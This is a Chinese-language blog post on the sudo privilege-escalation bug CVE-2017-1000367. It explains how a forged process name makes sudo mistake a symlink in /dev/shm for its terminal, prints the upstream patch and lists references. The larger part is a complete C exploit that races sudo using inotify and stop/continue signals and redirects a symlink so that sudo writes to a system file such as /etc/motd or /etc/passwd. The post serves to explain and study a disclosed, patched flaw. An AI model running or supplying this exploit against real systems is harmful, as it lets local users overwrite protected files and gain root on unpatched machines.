---
layout: post
title:  "Sudo < 1.8.20 Privilege Escalation"
subtitle: "CVE-2017-1000367"
date:   2020-05-30 18:11:48 +0800
categories: [geek]
---

## 一、所需条件和环境

- sudo < 1.8.20
- 系统需要开启 selinux
- sudo 需要有 selinux 支持 (sudo -r)
- 账户需要有 sudo 权限 e.g. "toor ALL=(ALL) NOPASSWD: /usr/bin/id"

### 创建新用户

```bash
$ groupadd mygroup1
$ useradd -m -d /home/myuser2 -g mygroup1 -s /bin/bash myuser2
$ passwd myuser2 
$ chown -R myuser2:mygroup1 file_or_directory
```

### /etc/sudoers

```bash
$ visudo
...
用户或组 来源主机=(可切换用户) 可执行命令
%mygroup1 ALL=(ALL) NOPASSWD:/usr/bin/id
...
```

## 二、漏洞原理

sudo 运行后，会首先调用 ```get_process_ttyname``` 获取设备名称，该函数取 [/proc/pid/stat](https://blog.csdn.net/cybertan/article/details/7596633) 中的第七个空格前的内容作为设备号，根据设备号获取设备名称，因此可以通过设置进程名称为 “     34834 ” 来伪造一个不存在的设备名 ```/dev/pts/57``` ，但是 sudo 在 ```/dev/pts/``` 下找不到 57，于是会在 ```/dev/``` 下进行广度优先搜索，除了个别忽略的目录，但是 ```/dev/shm/``` 和 ```/dev/mqueue``` 是任意用户可写并且在其搜索范围之内的，于是可以用软连接伪造。

```bash
$ ps auf              # 查看当前bash的pid号
$ cat /proc/pid/stat/ # 第七项即为设备号
"     34834 "
$ tty                 # 查看当前的设备名
/dev/pts/18
# 34834-18+57=34873 因此设备名pts/57对应的设备号tty_nr=34873
```

## 三、漏洞利用

```plain
伪造设备号 ("/dev/shm/_tmp/     34873 " -> /usr/bin/sudo)
    ↓
遍历/dev/
    ↓
遍历到/dev/shm/_tmp ←---SIGSTOP--- inotify_add_watch(..., IN_OPEN)
                                            ↓
/dev/shm/_tmp/_tty ←---SIGCONT---      openpty() (/dev/shm/_tmp/_tty -> /dev/pts/57)
    ↓
找到了设备名         ←---SIGSTOP--- inotify_add_watch(..., IN_CLOSE_NOWRITE)
                                            ↓
-r 选项将错误输出文件 ←---SIGSTOP--- 将/dev/shm/_tmp/_tty的软连接重定到/etc/passwd
```

```c
// compile: gcc -o sudopwn sudopwn.c -lutil 
#define _GNU_SOURCE
#include <errno.h>
#include <linux/sched.h>
#include <pty.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>

#define EVENT_SIZE	( sizeof (struct inotify_event) )
#define EVENT_BUF_LEN	( 1024 * ( EVENT_SIZE + 16 ) )

int main(){
	int  length, i = 0;
	int  fd, wd;
	char buffer[EVENT_BUF_LEN];
	int  master, slave;
	char pts_path[256];

	cpu_set_t  mask;
	struct sched_param params;
	params.sched_priority = 0;
	CPU_ZERO(&mask);
	CPU_SET(0, &mask);

	mkdir("/dev/shm/_tmp", 0755);
	symlink("/dev/pts/57", "/dev/shm/_tmp/_tty");
	symlink("/usr/bin/sudo", "/dev/shm/_tmp/     34873 ");

	fd = inotify_init();
	wd = inotify_add_watch( fd, "/dev/shm/_tmp", IN_OPEN | IN_CLOSE_NOWRITE );

 	pid_t pid = fork();
	if (pid == 0) {
		sched_setaffinity(pid, sizeof(mask), &mask);
		sched_setscheduler(pid, SCHED_IDLE, &params);
		setpriority(PRIO_PROCESS, pid, 19);		
		sleep(1);
		execlp("/dev/shm/_tmp/     34873 ", "sudo", "-r", "unconfined_r", "/usr/bin/id", "--\nHELLO\nWORLD\n", NULL);
	} else {
		setpriority(PRIO_PROCESS, 0, -20);
		int state = 0;
		buffer[EVENT_BUF_LEN - 1] = 0;
		while((length = read( fd, buffer, EVENT_BUF_LEN - 1 )) > 0) {
			kill(pid, SIGSTOP);

			i=0;
			while ( i < length ) {
				struct inotify_event *event = ( struct inotify_event * ) &buffer[i];

				if ( event->mask & IN_OPEN ) {
					puts("saw sudo opendir()s /dev/shm/_tmp/");
					//kill(pid, SIGSTOP);

					while(strcmp(pts_path,"/dev/pts/57")){
						openpty(&master, &slave, &pts_path[0], NULL, NULL);
						printf("parent openpty %s\n", pts_path);
					};
					//kill(pid, SIGCONT);
					break;
				} else if ( event->mask & IN_CLOSE_NOWRITE ) {
					puts("saw sudo closedir()s /dev/shm/_tmp/");
					//kill(pid, SIGSTOP);

					unlink("/dev/shm/_tmp/_tty");
					symlink("/etc/motd", "/dev/shm/_tmp/_tty");
					puts("re-symlink to the target file");
					//kill(pid, SIGCONT);

					state = 1;
					break;
				}
				i += EVENT_SIZE + event->len;	// event->len = Size of optional name field
			}
			kill(pid, SIGCONT);
			if(state == 1) break;
		}
		waitpid(pid, NULL, 0);
		inotify_rm_watch( fd, wd );
		close(fd);
		close(wd);

		unlink("/dev/shm/_tmp/_tty");
		unlink("/dev/shm/_tmp/     34873 ");
		rmdir("/dev/shm/_tmp");
		close(master);
		close(slave);
	}
}
```

## 四、补丁

```plain
diff -ru sudo-1.8.20/src/ttyname.c sudo-1.8.20-Q/src/ttyname.c
--- sudo-1.8.20/src/ttyname.c    2017-05-10 08:38:44.000000000 -0700
+++ sudo-1.8.20-Q/src/ttyname.c    2017-05-19 02:15:48.442705049 -0700

@@ -159,6 +159,8 @@
 
 static char *ignore_devs[] = {
     "/dev/fd/",
+    "/dev/mqueue/",
+    "/dev/shm/",
     "/dev/stdin",
     "/dev/stdout",
     "/dev/stderr",

@@ -493,28 +495,35 @@
     len = getline(&line, &linesize, fp);
     fclose(fp);
     if (len != -1) {
-        /* Field 7 is the tty dev (0 if no tty) */
-        char *cp = line;
-        char *ep = line;
-        const char *errstr;
-        int field = 0;
-        while (*++ep != '\0') {
-        if (*ep == ' ') {
-            *ep = '\0';
-            if (++field == 7) {
-            dev_t tdev = strtonum(cp, INT_MIN, INT_MAX, &errstr);
-            if (errstr) {
-                sudo_debug_printf(SUDO_DEBUG_ERROR|SUDO_DEBUG_LINENO,
-                "%s: tty device %s: %s", path, cp, errstr);
-            }
-            if (tdev > 0) {
-                errno = serrno;
-                ret = sudo_ttyname_dev(tdev, name, namelen);
-                goto done;
-            }
-            break;
-            }
-            cp = ep + 1;
+        /*
+         * Field 7 is the tty dev (0 if no tty).
+         * Since the process name at field 2 "(comm)" may include spaces,
+         * start at the last ')' found.
+         */
+        char *cp = strrchr(line, ')');
+        if (cp != NULL) {
+        char *ep = cp;
+        const char *errstr;
+        int field = 1;
+
+        while (*++ep != '\0') {
+            if (*ep == ' ') {
+            *ep = '\0';
+            if (++field == 7) {
+                dev_t tdev = strtonum(cp, INT_MIN, INT_MAX, &errstr);
+                if (errstr) {
+                sudo_debug_printf(SUDO_DEBUG_ERROR|SUDO_DEBUG_LINENO,
+                    "%s: tty device %s: %s", path, cp, errstr);
+                }
+                if (tdev > 0) {
+                errno = serrno;
+                ret = sudo_ttyname_dev(tdev, name, namelen);
+                goto done;
+                }
+                break;
+            }
+            cp = ep + 1;
        }
    }
```



## 五、参考链接：

- https://github.com/c0d3z3r0/sudo-CVE-2017-1000367
- https://www.openwall.com/lists/oss-security/2017/05/30/16
- https://www.freebuf.com/articles/system/136975.html
- https://bbs.pediy.com/thread-218260.htm